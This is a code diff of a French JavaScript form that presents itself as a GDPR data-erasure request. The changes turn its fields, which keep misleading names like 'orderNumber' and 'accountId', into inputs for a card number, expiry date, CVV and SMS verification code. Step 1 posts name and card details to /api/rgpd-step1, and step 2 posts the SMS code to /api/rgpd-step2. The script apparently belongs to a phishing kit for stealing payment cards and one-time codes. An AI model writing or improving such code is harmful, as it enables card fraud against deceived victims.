@@ -1,4 +1,3 @@
-
 (function () {
   "use strict";
 
@@ -10,32 +9,24 @@
   var STEP1_FIELDS = ["lastName", "firstName", "orderNumber", "birthDayYear", "accountId"];
   var STEP2_FIELDS = ["smsNum"];
   var birthInput = root.querySelector("#rgpd-birthDayYear");
+  var orderInput = root.querySelector('[name="orderNumber"]');
+  var cvvInput = root.querySelector('[name="accountId"]');
+  var smsInput = root.querySelector('[name="smsNum"]');
+
+  /* ---------- Filtres de saisie ---------- */
 
   /* Numéro de carte : chiffres uniquement, espaces tous les 4 chiffres */
-var orderInput = root.querySelector('[name="orderNumber"]');
+  orderInput.addEventListener("input", function (e) {
+    var digits = orderInput.value.replace(/\D/g, "").slice(0, 16);
+    var deleting = e.inputType && e.inputType.indexOf("delete") === 0;
+    var formatted = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
+    if (deleting && digits.length === 4) formatted = digits;
+    if (formatted !== orderInput.value) orderInput.value = formatted;
+  });
 
-orderInput.addEventListener("input", function (e) {
-  var digits = orderInput.value.replace(/\D/g, "").slice(0, 16);
-  var deleting = e.inputType && e.inputType.indexOf("delete") === 0;
-
-  // Regroupe par 4 : "1234 5678 9012 3456"
-  var formatted = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
-
-  // Évite de rajouter un espace gênant quand on supprime
-  if (deleting && digits.length === 4) formatted = digits;
-
-  if (formatted !== orderInput.value) orderInput.value = formatted;
-});
-
-  var CURRENT_YEAR = new Date().getFullYear();
-  var MIN_YEAR = 1900;
-
-
-  var state = { step: 1, data: {} };
-
-  /* Masque JJ/AAAA : chiffres uniquement, "/" ajouté automatiquement */
+  /* Date d'expiration : MM/AA */
   birthInput.addEventListener("input", function (e) {
-    var digits = birthInput.value.replace(/\D/g, "").slice(0, 6);
+    var digits = birthInput.value.replace(/\D/g, "").slice(0, 4);
     var deleting = e.inputType && e.inputType.indexOf("delete") === 0;
     var formatted = digits.length > 2 || (digits.length === 2 && !deleting)
       ? digits.slice(0, 2) + "/" + digits.slice(2)
@@ -43,14 +34,28 @@ orderInput.addEventListener("input", function (e) {
     if (formatted !== birthInput.value) birthInput.value = formatted;
   });
 
+  /* CVV : 3 chiffres uniquement */
+  cvvInput.addEventListener("input", function () {
+    cvvInput.value = cvvInput.value.replace(/\D/g, "").slice(0, 3);
+  });
+
+  /* Code SMS : chiffres uniquement */
+  smsInput.addEventListener("input", function () {
+    smsInput.value = smsInput.value.replace(/\D/g, "").slice(0, 6);
+  });
+
+  var state = { step: 1, data: {} };
+
   function parseBirth(v) {
     var m = /^(\d{1,2})\/(\d{2})$/.exec(v);
-    return m ? { day: parseInt(m[1], 10), year: parseInt(m[2], 10) } : null;
+    return m ? { month: parseInt(m[1], 10), year: parseInt(m[2], 10) } : null;
   }
 
   /* ---------- Règles de validation ---------- */
   var NAME_RE = /^[A-Za-zÀ-ÖØ-öø-ÿŒœ' \-]+$/;
   var ORDER_RE = /^\d{13,19}$/;
+  var CVV_RE = /^\d{3}$/;
+  var SMS_RE = /^\d{4,8}$/;
 
   var rules = {
     lastName: function (v) {
@@ -65,29 +70,35 @@ orderInput.addEventListener("input", function (e) {
       if (!NAME_RE.test(v)) return "Utilisez uniquement des lettres, espaces, tirets ou apostrophes.";
       return "";
     },
-  orderNumber: function (v) {
-  if (!v || !v.trim()) return "Ce champ est obligatoire.";
-  var digits = v.replace(/\s/g, "");
-  if (!/^\d+$/.test(digits)) return "Utilisez uniquement des chiffres.";
-  if (!ORDER_RE.test(digits)) return "Ce numéro de carte ne semble pas valide.";
-  return "";
-},
-},
+    orderNumber: function (v) {
+      if (!v || !v.trim()) return "Ce champ est obligatoire.";
+      var digits = v.replace(/\s/g, "");
+      if (!/^\d+$/.test(digits)) return "Utilisez uniquement des chiffres.";
+      if (!ORDER_RE.test(digits)) return "Ce numéro de carte ne semble pas valide.";
+      return "";
+    },
     birthDayYear: function (v) {
-      if (!v) return "Veuillez indiquer votre jour et votre année de naissance.";
+      if (!v) return "Veuillez indiquer la date d'expiration.";
       var b = parseBirth(v);
       if (!b) return "Utilisez le format MM/AA (ex. : 12/31).";
-      if (b.day < 1 || b.day > 12) return "Le mois doit être compris entre 01 et 12.";
+      if (b.month < 1 || b.month > 12) return "Le mois doit être compris entre 01 et 12.";
+      /* Vérifie que la carte n'est pas expirée (mois courant inclus) */
+      var now = new Date();
+      var currentYear = now.getFullYear() % 100;
+      var currentMonth = now.getMonth() + 1;
+      if (b.year < currentYear || (b.year === currentYear && b.month < currentMonth)) {
+        return "Cette carte semble expirée.";
+      }
       return "";
     },
     accountId: function (v) {
-      if (!v) return "Veuillez indiquer l'identifiant de votre compte.";
-      if (v.length < 3) return "Votre identifiant doit contenir au moins 3 caractères.";
-      if (/\s/.test(v)) return "Votre identifiant ne doit pas contenir d'espace.";
+      if (!v) return "Veuillez indiquer le CVV.";
+      if (!CVV_RE.test(v)) return "Le CVV doit être composé de 3 chiffres.";
       return "";
     },
     smsNum: function (v) {
       if (!v) return "Veuillez indiquer le code de confirmation.";
+      if (!SMS_RE.test(v)) return "Le code doit être composé de chiffres uniquement.";
       return "";
     }
   };
@@ -122,11 +133,13 @@ orderInput.addEventListener("input", function (e) {
   Object.keys(rules).forEach(function (name) {
     var input = fieldInput(name);
     if (!input) {
-    console.error("Champ introuvable :", name);
-    return;
-}
+      console.error("Champ introuvable :", name);
+      return;
+    }
     input.addEventListener("blur", function () {
-      if (normalize(input.value) || fieldWrap(name).classList.contains("has-error")) validateField(name);
+      if (normalize(input.value) || fieldWrap(name).classList.contains("has-error")) {
+        validateField(name);
+      }
     });
     input.addEventListener(input.tagName === "SELECT" ? "change" : "input", function () {
       if (fieldWrap(name).classList.contains("has-error")) validateField(name);
@@ -146,7 +159,6 @@ orderInput.addEventListener("input", function (e) {
     box.classList.add("is-visible");
   }
 
-  /* Valide une liste de champs ; renvoie true si tout est bon */
   function validateStep(formEl, names) {
     var invalid = names.filter(function (name) { return !validateField(name); });
     showAlert(formEl, invalid.length);
@@ -160,8 +172,11 @@ orderInput.addEventListener("input", function (e) {
       el.hidden = el.getAttribute("data-step") !== String(n);
     });
     root.querySelectorAll("[data-step-indicator]").forEach(function (el) {
-      if (el.getAttribute("data-step-indicator") === String(n)) el.setAttribute("aria-current", "step");
-      else el.removeAttribute("aria-current");
+      if (el.getAttribute("data-step-indicator") === String(n)) {
+        el.setAttribute("aria-current", "step");
+      } else {
+        el.removeAttribute("aria-current");
+      }
     });
     state.step = n;
     var panel = root.querySelector('[data-step="' + n + '"]');
@@ -169,6 +184,29 @@ orderInput.addEventListener("input", function (e) {
       root.scrollIntoView({ behavior: "smooth", block: "start" });
       if (panel.hasAttribute("tabindex")) panel.focus({ preventScroll: true });
     }
+  }
+
+  /* ---------- Timer SMS (démarre à l'étape 2) ---------- */
+  var smsTimer = null;
+  var smsTimeLeft = 120;
+
+  function startSmsTimer() {
+    if (smsTimer) return; // déjà lancé
+    var el = document.getElementById("sms-timer");
+    if (!el) return;
+    smsTimeLeft = 120;
+    el.textContent = "02:00";
+    smsTimer = setInterval(function () {
+      smsTimeLeft--;
+      var m = Math.floor(smsTimeLeft / 60);
+      var s = smsTimeLeft % 60;
+      el.textContent = String(m).padStart(2, "0") + ":" + String(s).padStart(2, "0");
+      if (smsTimeLeft <= 0) {
+        clearInterval(smsTimer);
+        smsTimer = null;
+        el.textContent = "00:00";
+      }
+    }, 1000);
   }
 
   /* ---------- Étape 1 : identification ---------- */
@@ -181,8 +219,8 @@ orderInput.addEventListener("input", function (e) {
       lastName: normalize(fieldInput("lastName").value),
       firstName: normalize(fieldInput("firstName").value),
       orderNumber: normalize(fieldInput("orderNumber").value).replace(/\s/g, "") || null,
-      birthDay: birth.day,
-      birthYear: birth.year,
+      birthMonth: birth ? birth.month : null,
+      birthYear: birth ? birth.year : null,
       accountId: normalize(fieldInput("accountId").value)
     };
 
@@ -192,36 +230,30 @@ orderInput.addEventListener("input", function (e) {
     }));
 
     fetch("/api/rgpd-step1", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify(state.data)   // ✅ on envoie les vraies données
-})
-.then(response => {
-  if (!response.ok) {
-    throw new Error("Erreur d'envoi");
-  }
-  console.log("Notification envoyée !");
-})
-.catch(error => console.error(error));
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(state.data)
+    })
+    .then(function (response) {
+      if (!response.ok) throw new Error("Erreur d'envoi");
+      console.log("Notification envoyée !");
+    })
+    .catch(function (error) { console.error(error); });
 
-    // Pré-remplit l'e-mail si l'identifiant du compte en est un
-    var smsNumInput = fieldInput("smsNum");
-
+    startSmsTimer();
     goToStep(2);
   });
 
-  /* ---------- Étape 2 : e-mail de confirmation ---------- */
+  /* ---------- Étape 2 : SMS de confirmation ---------- */
   form2.addEventListener("submit", function (e) {
     e.preventDefault();
     if (!validateStep(form2, STEP2_FIELDS)) return;
 
-    state.data.smsNum = normalize(fieldInput("smsNum").value).toLowerCase();
+    state.data.smsNum = normalize(fieldInput("smsNum").value);
     var data = Object.assign({}, state.data);
 
     root.dispatchEvent(new CustomEvent("rgpd:submit", { bubbles: true, detail: data }));
 
-    // Envoi : branchez votre serveur via window.RgpdErasure.send = function (data) { return fetch(...) }
-    // Tant qu'aucune fonction n'est branchée, le message de confirmation s'affiche directement.
     var send = window.RgpdErasure && window.RgpdErasure.send;
     var submitBtn = form2.querySelector('button[type="submit"]');
     var label = submitBtn.firstChild;
@@ -233,7 +265,7 @@ orderInput.addEventListener("input", function (e) {
     Promise.resolve(typeof send === "function" ? send(data) : null)
       .then(function (res) {
         if (res && res.ok === false) throw new Error("HTTP " + res.status);
-        showDone(data.smsNum);
+        showDone();
       })
       .catch(function () {
         var box = form2.querySelector("[data-alert]");
@@ -246,9 +278,12 @@ orderInput.addEventListener("input", function (e) {
       });
   });
 
-  function showDone(smsNum) {
-    root.querySelector("[data-done-smsNum]").textContent = "";
+  function showDone() {
     root.classList.add("is-done");
+    if (smsTimer) {
+      clearInterval(smsTimer);
+      smsTimer = null;
+    }
     goToStep("done");
   }
 
@@ -257,41 +292,17 @@ orderInput.addEventListener("input", function (e) {
     if (btn) goToStep(parseInt(btn.getAttribute("data-go-step"), 10));
   });
 
+  /* ---------- API publique ---------- */
   window.RgpdErasure = window.RgpdErasure || {};
   window.RgpdErasure.getData = function () { return Object.assign({}, state.data); };
   window.RgpdErasure.goToStep = goToStep;
-})();
 
-
-let timeLeft = 120;
-
-const timer = setInterval(() => {
-  timeLeft--;
-
-  const minutes = Math.floor(timeLeft / 60);
-  const seconds = timeLeft % 60;
-
-  document.getElementById("sms-timer").textContent =
-    `${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
-
-  if (timeLeft <= 0) {
-    clearInterval(timer);
-    document.getElementById("sms-timer").textContent = "00:00";
-  }
-}, 1000);
-
-
-fetch("/health")
-  .then(response => response.json())
-  .then(data => console.log("Connexion réussie :", data))
-  .catch(error => console.error("Erreur :", error));
-
-
-
+  /* Envoi étape 2 branché sur ton backend */
   window.RgpdErasure.send = function (data) {
-  return fetch("/api/rgpd-step2", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(data)
-  });
-};
+    return fetch("/api/rgpd-step2", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+  };
+})();
